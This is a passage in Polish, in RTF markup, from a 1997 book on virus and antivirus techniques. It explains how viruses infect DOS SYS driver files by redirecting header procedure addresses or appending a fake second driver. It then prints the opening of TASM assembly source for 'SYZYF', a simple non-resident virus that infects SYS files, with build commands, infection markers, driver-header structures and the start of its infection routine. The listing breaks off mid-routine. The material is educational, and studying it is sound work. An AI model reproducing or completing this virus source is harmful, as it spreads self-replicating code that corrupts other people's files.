\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Adres procedury przerwania (wzgl\uc1\u281\'eadem pocz\uc1\u261\'b9tku nag\uc1\u322\'b3\'f3wka), kt\'f3ra na podstawie pakietu zlecenia, przyj\uc1\u281\'eatego przez procedur\uc1\u281\'ea strategii, wykonuje odpowiednie czynno\uc1\u347\'9cci,}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:4; bot-attach:5; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx835\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}0A-0F}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:4; bot-attach:5; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Nazwa urz\uc1\u261\'b9dzenia znakowego (8 znak\'f3w) lub liczba jednostek dla urz\uc1\u261\'b9dzenia blokowego (1 bajt wykorzystany+7 bajt\'f3w rezerwowych).}\cell{\*\abiendcell}\row}{\*\abiendtable}\par
\pard\plain\ltrpar\ql\itap0{\f3\fs20\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Aby zainfekowa\uc1\u263\'e6 plik SYS, wystarczy zmieni\uc1\u263\'e6 adres kt\'f3rej\uc1\u347\'9c z procedur zawartych w polach 06h-07h lub 08h-09h tak, aby wskazywa\uc1\u322\'b3 on na kod wirusa, kt\'f3ry zostaje dopisywany na ko\uc1\u324\'f1cu pliku. Po wczytaniu przez DOS zara\uc1\u380\'bfonego w ten spos\'f3b pliku zawsze zostaje wywo\uc1\u322\'b3ana procedu}{\f1\fs24\lang1045{\*\listtag0}r}{\f0\fs24\lang1045{\*\listtag0}a inicjalizacji sterownika, co pozwala wirusowi natychmiast zainstalowa\uc1\u263\'e6 si\uc1\u281\'ea w systemie, a nast\uc1\u281\'eapnie odda\uc1\u263\'e6 sterowanie oryginalnemu programowi obs\uc1\u322\'b3ugi.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Alternatywnym (i chyba prostszym) sposobem zara\uc1\u380\'bfenia plik\'f3w SYS jest wykorzystanie faktu, i\uc1\u380\'bf plik taki mo\uc1\u380\'bfe zawiera\uc1\u263\'e6 wi\uc1\u281\'eacej ni\uc1\u380\'bf jeden sterownik. Aby zainfekowa\uc1\u263\'e6 plik SYS, wystarczy wi\uc1\u281\'eac na pocz\uc1\u261\'b9tku pliku zmieni\uc1\u263\'e6 pole 00-03 tak, aby wskazywa\uc1\u322\'b3o ono na koniec pliku, gdzie nale\uc1\u380\'bfy doda\uc1\u263\'e6 kod wirusa, kt\'f3rego wygl\uc1\u261\'b9d b\uc1\u281\'eadzie podobny do zwyk\uc1\u322\'b3ego sterownika (b\uc1\u281\'eadzie posi}{\f1\fs24\lang1045{\*\listtag0}a}{\f0\fs24\lang1045{\*\listtag0}da\uc1\u322\'b3 nag\uc1\u322\'b3\'f3wek oraz procedury strategii i przerwa\uc1\u324\'f1). Podczas inicjacji DOS uruchomi oba zawarte w pliku sterowniki i w efekcie umo\uc1\u380\'bfliwi dzia\uc1\u322\'b3anie wirusowi. Jak wida\uc1\u263\'e6, spos\'f3b infekcji tych plik\'f3w jest bardzo prosty, st\uc1\u261\'b9d dziwi troch\uc1\u281\'ea fakt, i\uc1\u380\'bf stosunkowo ma\uc1\u322\'b3a}{\f1\fs24\lang1045{\*\listtag0} }{\f0\fs24\lang1045{\*\listtag0}liczba wirus\'f3w potrafi je zara\uc1\u380\'bfa\uc1\u263\'e6.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Wygl\uc1\u261\'b9d pliku SYS po zara\uc1\u380\'bfeniu pokazano w poni\uc1\u380\'bfszych tabelach.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch Zainfekowany plik SYS (ze zmian\uc1\u261\'b9 adres\'f3w procedur w nag\uc1\u322\'b3\'f3wku)}{\*\abitableprops table-col-spacing:0.02in; table-column-leftpos:-0.0486in; table-column-props:6.6085in/; table-sdh:893db90}\par{\*\abicellprops left-attach:0; right-attach:1; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}{
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx9460
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Zawarto\uc1\u347\'9c\uc1\u263\'e6 pliku }\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx9460
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Nag\uc1\u322\'b3\'f3wek sterownika ze zmienionymi adresami procedur strategii lub przerwania}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Kod sterownika}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Kod wirusa }\cell{\*\abiendcell}\row}{\*\abiendtable}\par
\pard\plain\ltrpar\ql\itap0{\f3\fs20\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch Zainfekowany plik SYS (drugi fa\uc1\u322\'b3szywy sterownik)}{\*\abitableprops table-col-spacing:0.02in; table-column-leftpos:-0.0486in; table-column-props:6.6085in/; table-sdh:8927b88}\par{\*\abicellprops left-attach:0; right-attach:1; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}{
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx9460
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Zawarto\uc1\u347\'9c\uc1\u263\'e6 pliku }\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx9460
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Nag\uc1\u322\'b3\'f3wek sterownika ze zmian\uc1\u261\'b9 adresu wskazuj\uc1\u261\'b9cego na po\uc1\u322\'b3o\uc1\u380\'bfenie drugiego sterownika w pliku}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Kod sterownika }{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Nag\uc1\u322\'b3\'f3wek fa\uc1\u322\'b3szywego sterownika (wirusa) }{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Kod wirusa}\cell{\*\abiendcell}\row}{\*\abiendtable}\par
\pard\plain\ltrpar\ql\itap0{\f3\fs20\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Ponizej przedstawiono przyklad prostego nierezydentnego wirusa infekujacego pliki SYS.}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;----------------------------------------------------------------------------;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;       Czesc ksiazki : "Nowoczesne techniki wirusowe i antywirusowe"        ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                  SYZYF v1.0, Autor : Adam Blaszczyk 1997                   ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;              Prosty wirus nierezydentny plikow SYS                         ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;              Infekuje pliki z atrybutem Archive, ReadOnly, System, Hidden  ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;              znajdujace sie w biezacym katalogu                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ; Kompilacja :                                                               ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;             TASM    SYZYF.ASM                                              ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;             TLINK   SYZYF.OBJ                                              ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;             MAKESYS SYZYF.EXE                                              ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;----------------------------------------------------------------------------;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch SYZYF SEGMENT}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch JUMPS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch          ASSUME CS:SYZYF, DS:SYZYF}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch          ORG 0000h                         ; SYS nie potrzebuje PSP}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     NUL          = 00h                     ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     LF           = 0Ah                     ;  - stale znakow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     CR           = 0Dh                     ; /  ASCII}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     AtrReadOnly  = 00000001b               ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     AtrHidden    = 00000010b               ;  \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     AtrSystem    = 00000100b               ;   \\ rozne stale atrybutow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     AtrVolumeID  = 00001000b               ;   / pozycji katalogu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     AtrDirectory = 00010000b               ;  /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     AtrArchive   = 00100000b               ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Atrybut = AtrArchive + AtrReadOnly + AtrSystem + AtrHidden + AtrVolumeID}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; atrybut poszukiwanej pozycji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; katalogu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch VirusDlug   = offset (VirusEnd-VirusStart) ; dlugosc kodu wirusa}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch VRok        = 1998                         ; \\  data opisujaca}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch VMiesiac    = 13                           ;  - pliki juz zainfekowane}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch VDzien      = 31                           ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch VZnacznik     = (VRok-1980)*512+VMiesiac*32+VDzien}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DTAStruc struc                             ; struktura DTA bufora transmisji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; dyskowych uzywanych przez}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; funkcje 4E i 4F}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                DTAFill db 21 dup (?)       ; nieistotna czesc}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                DTAAttr db ?                ; atrybut znalezionej pozycji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                DTATime dw ?                ; czas znalezionej pozycji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                DTADate dw ?                ; data znalezionej pozycji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                DTASize dd ?                ; dlugosc znalezionej pozycji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                DTAName db 13 dup (?)       ; nazwa znalezionej pozycji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DTAStruc ends}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch NAGL struc}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                NAGLAdres      dd ?         ; Adres nastepnego sterownika}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                NAGLAtrybut    dw ?         ; atrybuty sterownika}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                NAGLStrategia  dw ?         ; adres obslugi strategii}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                NAGLPrzerwanie dw ?         ; adres obslugi przerwania}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                NAGLNazwa      db 8 dup(?)  ; nazwa sterownika}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch NAGL ends}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Start:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     SYSNagl NAGL <0FFFFFFFFh,8000h,ProceduraStrategii,ProceduraPrzerwania,'SYZYF'>}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; tu jest naglowek}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch VirusStart:                                ; tu zaczyna sie kod wirusa}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ProceduraPrzerwania:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     push   ax                              ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     push   bx                              ;  \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     push   cx                              ;   \\    zachowaj}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     push   dx                              ;    \\   zmieniane}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     push   si                              ;    /   rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     push   di                              ;   /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     push   ds                              ;  /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     push   es                              ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call   Trik}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Trik:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     pop    si}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     sub    si,offset Trik}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     push   cs                              ; \\ DS=CS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     pop    ds                              ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov    ax,[si][StarePrzerwanie]        ; zachowaj adres do nosiciela}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov    [si][SkokIP],ax}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov    [si][SkokCS],cs}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     lea    dx,[si][TeInformacja]           ; podaj gdzie jest tekst}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call   Informacja                      ; spytaj o uruchomienie wirusa}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jnc   Infekcja                         ; gdy CF=1, nie uruchamiaj}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jmp   BezInfekcji                      ; NIE - nie infekuj}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Infekcja:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ah,2Fh                           ; funkcja DOS - pobierz adres DTA}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h                              ; wywolaj funkcje DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   word ptr [si][DTASegOfs+2],bx    ; \\ zachowaj akualny adres DTA,}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   word ptr [si][DTASegOfs+2],es    ; / aby mozna bylo go przywrocic}{\f2\fs24\lang1045{\*\listtag0}\par}
